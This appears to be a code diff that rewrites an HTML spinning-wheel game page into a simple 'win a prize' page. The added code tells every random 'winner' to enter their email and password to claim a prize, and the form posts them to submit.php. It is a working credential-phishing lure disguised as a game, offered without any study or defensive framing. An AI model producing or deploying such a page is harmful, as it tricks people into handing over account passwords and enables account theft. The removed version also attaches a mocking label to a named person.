@@ -3,201 +3,107 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Spinning Wheels Game</title>
+<title>Welcome to My Website</title>
 <style>
     body {
+        font-family: Arial, sans-serif;
         margin: 0;
         padding: 0;
-        height: 100vh;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        overflow: hidden;
-        background-color: #000;
+        background-color: #f0f0f0;
+    }
+
+    header {
+        background-color: #333;
         color: #fff;
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        padding: 20px;
+        text-align: center;
+    }
+
+    h1 {
+        margin: 0;
     }
 
     .container {
-        display: flex;
-        justify-content: space-between;
-        width: 800px;
-        height: 350px;
-        opacity: 0;
-        transition: opacity 0.5s ease-in-out;
-    }
-
-    .wheel-container {
-        position: relative;
-        width: 300px;
-        height: 300px;
-        background-color: #000;
-        border-radius: 50%;
-        box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
-        overflow: hidden;
+        max-width: 600px;
+        margin: 20px auto;
         padding: 20px;
-        text-align: center;
-        opacity: 0;
-    }
-
-    .wheel {
-        width: 100%;
-        height: 100%;
-        border-radius: 50%;
-        position: relative;
-        overflow: hidden;
-    }
-
-    .wheel::before {
-        content: "";
-        position: absolute;
-        top: 0;
-        left: 50%;
-        transform: translateX(-50%);
-        width: 3px;
-        height: 50%;
-        background-color: #0f0;
-        z-index: 2;
-    }
-
-    .wheel::after {
-        content: "";
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        width: 100%;
-        height: 100%;
-        background-image: radial-gradient(circle, #000 20%, transparent 20%);
-        background-repeat: repeat;
-        background-position: 0 0;
-        animation: spin 4s infinite linear;
-    }
-
-    @keyframes spin {
-        100% {
-            transform: rotate(360deg);
-        }
-    }
-
-    .spin-button {
-        display: none;
-        position: absolute;
-        bottom: 20px;
-        left: 50%;
-        transform: translateX(-50%);
-        padding: 10px 20px;
-        font-size: 16px;
-        background-color: #007bff;
-        color: #fff;
-        border: none;
+        background-color: #fff;
         border-radius: 5px;
-        cursor: pointer;
-        box-shadow: 0 4px 6px rgba(0, 123, 255, 0.5);
-        transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
     }
 
-    .spin-button:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 6px 8px rgba(0, 123, 255, 0.7);
-    }
-
-    .result {
-        margin-top: 20px;
-        text-align: center;
-        color: white;
+    #game-result {
         font-size: 20px;
-    }
-
-    .highlight {
-        color: #0f0;
-        font-size: 36px;
         margin-bottom: 20px;
     }
 
-    .options {
-        text-align: center;
-        margin-top: 20px;
-        opacity: 0;
-        transition: opacity 0.5s ease-in-out;
+    #email-form {
+        display: none;
     }
 
-    .option-button {
-        padding: 10px 20px;
-        font-size: 16px;
-        background-color: #007bff;
-        color: #fff;
-        border: none;
+    label {
+        display: block;
+        margin-bottom: 10px;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    input[type="submit"] {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 20px;
+        border: 1px solid #ccc;
         border-radius: 5px;
-        cursor: pointer;
-        margin: 0 10px;
-        box-shadow: 0 4px 6px rgba(0, 123, 255, 0.5);
-        transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+        box-sizing: border-box;
     }
 
-    .option-button:hover {
-        background-color: #0056b3;
-        transform: translateY(-2px);
-        box-shadow: 0 6px 8px rgba(0, 123, 255, 0.7);
+    input[type="submit"] {
+        background-color: #333;
+        color: #fff;
+        cursor: pointer;
     }
 </style>
 </head>
 <body>
-<div class="options">
-    <button class="option-button" onclick="startGame(true)">Play Game</button>
-    <button class="option-button" onclick="startGame(false)">Don't Play</button>
-</div>
-<div class="container" id="container">
-    <div class="wheel-container" id="wheel1">
-        <div class="highlight">Wheel 1</div>
-        <div class="title">Best Quality Engineer:</div>
-        <div class="name">Tomasz Czornik</div>
-        <div class="wheel"></div>
+<header>
+    <h1>Welcome to My Website</h1>
+    <p>Play our simple game and win a prize!</p>
+</header>
+
+<div class="container">
+    <div id="game-result">
+        Click the button to play the game!
     </div>
-    <div class="wheel-container" id="wheel2">
-        <div class="highlight">Wheel 2</div>
-        <div class="title">Best Sick Leaver:</div>
-        <div class="name">Chris Burmeister</div>
-        <div class="wheel"></div>
+    <button onclick="playGame()">Play Game</button>
+
+    <div id="email-form">
+        <h2>Congratulations!</h2>
+        <p>You won the game!</p>
+        <p>Please enter your email and password to claim your prize:</p>
+        <form action="submit.php" method="post">
+            <label for="email">Email:</label>
+            <input type="text" id="email" name="email" required>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            <input type="submit" value="Submit">
+        </form>
     </div>
 </div>
-<button class="spin-button" onclick="spinWheel()">Spin</button>
-<div class="result" id="result"></div>
 
 <script>
-    function startGame(play) {
-        if (play) {
-            document.querySelectorAll('.option-button').forEach(button => {
-                button.style.display = 'none';
-            });
-            document.getElementById('container').style.opacity = '1';
-            document.querySelectorAll('.wheel-container').forEach(wheel => {
-                wheel.style.opacity = '1';
-            });
-            document.querySelector('.spin-button').style.display = 'block';
+    function playGame() {
+        // Generate a random number between 0 and 1
+        const randomNumber = Math.random();
+
+        // Check if the random number is greater than 0.5 to simulate winning
+        if (randomNumber > 0.5) {
+            // If the player wins, show the email form
+            document.getElementById('game-result').innerText = 'Congratulations! You won!';
+            document.getElementById('email-form').style.display = 'block';
         } else {
-            alert("That's okay. Maybe next time!");
+            // If the player loses, inform them to try again
+            document.getElementById('game-result').innerText = 'Sorry, you didn\'t win. Try again!';
         }
-    }
-
-    function spinWheel() {
-        const wheels = document.querySelectorAll('.wheel');
-        wheels.forEach(wheel => {
-            wheel.style.animation = 'spin 4s infinite linear';
-        });
-        setTimeout(() => {
-            wheels.forEach(wheel => {
-                wheel.style.animation = 'none';
-            });
-            calculateResult();
-        }, 4000); // Adjust the duration to match the spin animation duration
-    }
-
-    function calculateResult() {
-        // This function will be responsible for determining the result of the spin
-        // You can implement your logic here to decide what prize or action corresponds to the result
-        const resultDiv = document.getElementById('result');
-        resultDiv.innerText = 'Congratulations! You won!';
     }
 </script>
 </body>
